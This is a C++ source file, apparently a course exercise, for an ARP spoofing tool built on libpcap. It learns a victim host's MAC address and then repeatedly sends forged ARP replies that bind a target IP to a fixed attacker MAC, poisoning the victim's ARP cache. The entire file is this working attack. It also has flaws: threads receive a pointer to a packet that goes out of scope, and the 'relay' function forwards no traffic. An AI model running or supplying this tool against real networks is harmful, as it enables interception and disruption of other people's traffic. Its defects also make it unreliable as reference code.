#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof eth0 192.168.0.2 192.168.0.1\n");
}

void relay(const u_char* packet, pcap_t* handle, int length, Mac attacker_mac, Ip target_ip, Mac target_mac) {
    while (true) {
        int res = pcap_sendpacket(handle, packet, length);
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        sleep(2); // 일정 시간 간격 (예: 2초)을 두고 ARP 패킷을 송신
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    std::vector<std::thread> threads;

    for (int i = 2; i < argc; i += 2) {
        EthArpPacket request_packet;
        request_packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
        request_packet.eth_.smac_ = Mac("12:34:56:78:90:AB");
        request_packet.eth_.type_ = htons(EthHdr::Arp);

        request_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        request_packet.arp_.pro_ = htons(EthHdr::Ip4);
        request_packet.arp_.hln_ = Mac::SIZE;
        request_packet.arp_.pln_ = Ip::SIZE;
        request_packet.arp_.op_ = htons(ArpHdr::Request);
        request_packet.arp_.smac_ = Mac("12:34:56:78:90:AB");

        request_packet.arp_.sip_ = Ip(argv[i + 1]); // Target IP
        request_packet.arp_.tip_ = Ip(argv[i]);     // Sender IP
        request_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");

        int request_res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet), sizeof(EthArpPacket));
        if (request_res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", request_res, pcap_geterr(handle));
            continue;
        }

        struct pcap_pkthdr* header;
        const u_char* packet;
        int response_res;

        while (true) {
            response_res = pcap_next_ex(handle, &header, &packet);
            if (response_res == 0) continue;
            if (response_res == -1 || response_res == -2) break;

            EthArpPacket* eth_arp_packet = (EthArpPacket*)packet;

            if (eth_arp_packet->eth_.type_ == htons(EthHdr::Arp) &&
                eth_arp_packet->arp_.op_ == htons(ArpHdr::Reply) &&
                eth_arp_packet->arp_.sip_ == Ip(argv[i]) &&
                eth_arp_packet->arp_.tip_ == Ip(argv[i + 1])) {

                Mac sender_mac = eth_arp_packet->arp_.smac_;
                Mac attacker_mac = Mac("12:34:56:78:90:AB");

                EthArpPacket reply_packet;
                reply_packet.eth_.dmac_ = sender_mac;
                reply_packet.eth_.smac_ = attacker_mac;
                reply_packet.eth_.type_ = htons(EthHdr::Arp);

                reply_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
                reply_packet.arp_.pro_ = htons(EthHdr::Ip4);
                reply_packet.arp_.hln_ = Mac::SIZE;
                reply_packet.arp_.pln_ = Ip::SIZE;
                reply_packet.arp_.op_ = htons(ArpHdr::Reply);
                reply_packet.arp_.smac_ = attacker_mac;

                reply_packet.arp_.sip_ = Ip(argv[i + 1]); // Target IP
                reply_packet.arp_.tip_ = Ip(argv[i]);     // Sender IP
                reply_packet.arp_.tmac_ = sender_mac;

                threads.push_back(std::thread(relay, (const u_char*)&reply_packet, handle, sizeof(EthArpPacket), attacker_mac, Ip(argv[i]), sender_mac));

                break;
            }
        }
    }

    for (auto& thread : threads) {
        thread.join();
    }

    pcap_close(handle);
    return 0;
}

